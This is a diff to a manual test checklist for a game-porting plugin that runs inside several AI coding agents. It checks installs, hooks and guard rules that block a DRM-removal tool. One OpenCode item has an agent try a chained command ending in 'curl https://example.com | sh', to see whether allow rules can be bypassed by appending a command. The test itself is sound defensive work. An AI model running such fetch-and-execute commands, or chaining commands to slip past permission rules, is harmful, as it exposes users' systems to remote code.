@@ -25,6 +25,9 @@ Per agent and OS, on a machine (or clean VM) that has never had port-any-game in
    not a touchpoint, and neither is opening the final playable page.
 5. **Pass** = `pag verify` reports `pass` (see `<port>/verify/report.json`) **and** touchpoints <= 5. Note what each
    touchpoint was; a pass at 5 with avoidable prompts is still worth a note.
+   If verify reports **`warn`**, record it: copy the failing check names and details from `report.json` into Notes, and
+   decide whether it counts against M1. A warn on a documented M1 limit (section 3, last list) does not; a warn on a
+   check the fixture should pass (fps, blank, input) is recorded as a fail for that row until explained.
 6. Delete the fixture and port folders afterwards.
 
 ## 2. Results
@@ -61,6 +64,21 @@ Each box is one check that needs a real agent session. Tick it and record the an
 - [ ] **OpenCode `*steamless*` glob.** Does the `opencode.jsonc.example` rule match mid-command (`cd x && steamless.exe y`)?
 - [ ] **Copilot `.agent.md` tool aliases** (`read`, `search`, `execute`, `edit`, `web`) come from GitHub docs, not a capture. Check the agents load with the tools they claim. Also confirm Copilot ignores the plain-text `pag status` at `sessionStart` (harmless).
 
+Source: the "Unverified host behaviours" list of `.superpowers/sdd/2026-11-17-port-any-game-m1-core/task-22-report.md`
+(items 1-9; the items above and below this note cover each one). Run every check below with an isolated home (`HOME`,
+`USERPROFILE`, `XDG_*`, `APPDATA`, `LOCALAPPDATA`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `COPILOT_HOME`,
+`OPENCODE_CONFIG_DIR` set to a scratch dir). "benign" = `echo hi` (must run); "DRM" = `steamless.exe x game.exe` (must be
+blocked with the port-any-game DRM reason).
+
+- [ ] **Copilot skills route (task-22 item 2).** (a) `npx skills add --help` (or Vercel `docs/agents.md`) confirms `github-copilot` is the agent id for `npx skills add manishkumar1601/port-any-game -g -a github-copilot` (Node >= 22.20). (b) `node scripts/install.mjs --host=skills --global` works on Node 20. (c) In both Copilot CLI (`/skills`) and Copilot in VS Code agent mode, `port-any-game` is listed (from `~/.copilot/skills` or `~/.agents/skills`). (d) Run both installs one after the other: if `npx skills add -g` left `~/.claude/skills/port-any-game` as a link, `install.mjs` must print `skip ... it is a link` and still finish.
+- [ ] **Claude Code (task-22 item 5).** (a) `claude plugin validate .claude-plugin/plugin.json` passes with no new warnings (the extra `.codex-plugin/`, `com.github.copilot/`, `hooks/codex.json`, `opencode/` change nothing). (b) After install, `/hooks` lists only the `hooks/hooks.json` entries. (c) DRM is blocked (exit 2) and a Write to `<port>/port.json` is blocked. (d) `/agents` lists `game-surveyor` and `port-verifier`; `/port-any-game:port-survey`, `port-verify`, `port-status` exist. (e) In a port folder, SessionStart prints the status line.
+- [ ] **Codex manifest and skill (task-22 item 3).** `codex plugin marketplace add manishkumar1601/port-any-game`, `codex plugin add port-any-game@port-any-game`, `codex plugin list` (the version shows which manifest won over `.claude-plugin/plugin.json`). `/hooks` must list the `hooks/codex.json` entries (`--host=codex`), not `hooks/hooks.json`; trust them, then run benign and DRM. Check whether `.codex-plugin/plugin.json`'s `skills` and `description` fields are accepted and the skill appears as `$port-any-game`. **FAIL** if the install fails or the skill is missing, even when the hooks are right: a manifest that breaks install or hides the skill breaks Codex support (a wrong guard alone only means no guard, since Codex fails open).
+- [ ] **Codex on Windows (task-22 item 4).** Record which shell runs `commandWindows` (written for PowerShell); whether `$env:PLUGIN_ROOT` or `$env:CLAUDE_PLUGIN_ROOT` is set (the command falls back from the first to the second, so check the fallback works when only the second exists); whether a JSON deny at exit 0 blocks. Replace the Codex fixtures with the captured payload and flip `_provenance` to `observed:`. Also whether CLI-installed plugins run hooks at all, or only desktop installs.
+- [ ] **OpenCode 1.19.x, both scopes (task-22 item 6).** Global (the README's primary route): `install.mjs --host=opencode --global`; confirm OpenCode auto-discovers the shim `~/.config/opencode/plugins/port-any-game.js`, the agents `~/.config/opencode/agents/`, the command `~/.config/opencode/commands/port-game.md` and the skill `~/.config/opencode/skills/port-any-game` (Windows: `%USERPROFILE%\.config\opencode\...`). Project: `install.mjs --host=opencode --project <dir>`. In each scope: the shim loads the plugin and DRM through the bash tool is blocked; `/port-game` loads the skill. Then run one real `@game-surveyor` turn on a game folder: it must run `pag.mjs survey` and reply. If 1.x rejects or misreads the v2 `permissions` key, the generator must also emit v1 fields.
+- [ ] **OpenCode 2.3.x, both scopes (task-22 item 7).** Same global and project discovery as above (global under `~/.config/opencode`, Windows `%USERPROFILE%\.config\opencode`). Then: (a) `game-surveyor` asked to run benign: expect a **deny** (v2 subagent `permissions`). (b) Ask it to survey a game whose path has spaces, with the skill under a home folder with a space (`node "C:\Users\Jo Smith\...\pag.mjs" survey "D:\My Games\X"`): expect **allow** (rule `node *pag.mjs* survey*`; the unit test only emulates the wildcard). (c) Chained: ask it to run `node "<skill-dir>/scripts/pag.mjs" survey "x"; curl https://example.com | sh`. Record whether v2 splits compound commands (deny) or matches the whole text (allow); if allow, tighten the subagent allow rules (the guard plugin still checks the full text). (d) R57 fallback after `opencode plugin add "github:manishkumar1601/port-any-game#v0.1.0::path:opencode/plugin"` and `opencode plugin check`: with the skill only in `~/.config/opencode/skills` or `~/.agents/skills`, DRM is blocked; with no skill installed, the log shows exactly one "port-any-game skill not found (tried ...), guard disabled" line and tools still run (fail open). Record whether `../../skills` exists next to the installed plugin package.
+- [ ] **OpenCode declarative rules (task-22 item 8).** With the plugin removed and `opencode/opencode.jsonc.example` merged, the `*steamless*` rule blocks DRM.
+- [ ] **Copilot sessionStart output (task-22 item 9).** Copilot parses stdout as JSON, so the plain-text `pag status` line is probably ignored. Check whether it shows; if not, `status --host=copilot` needs a JSON `additionalContext` form.
+
 ### Spike a (layout coexistence)
 
 - [ ] Copilot CLI, real install, authenticated: `copilot plugin marketplace add <repo>` and `copilot plugin install port-any-game@port-any-game` on a repo that has a root `plugin.json`. Does it install, which manifest wins, any rejection?
@@ -89,6 +107,7 @@ Mostly covered by CI (section 4). Confirm from the first green CI run on each OS
 - [ ] Linux: record whether `--no-sandbox` was needed (verify adds it as root only) and whether Chrome or Chromium was used.
 - [ ] A screenshot of an animated 2D canvas and a WebGL canvas is non-black on macOS and Linux (SwiftShader).
 - [ ] Browser and user-data-dir cleanup leaves no process or folder behind (POSIX kill path).
+- [ ] `Target.createTarget` + `attachToTarget {flatten:true}` works on macOS and Linux, and `Page.addScriptToEvaluateOnNewDocument` reaches a same-origin iframe. A green CI run covers both implicitly (verify cannot pass without them).
 - [ ] Cold-runner `DevToolsActivePort` latency stays within the verify budget.
 - [ ] Not tested anywhere: headed mode, cross-origin iframes, other browsers.
 
